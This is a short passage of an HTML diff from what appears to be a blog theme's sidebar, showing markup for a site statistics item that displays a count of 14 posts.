+                    <span class="site-state-item-count">14</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
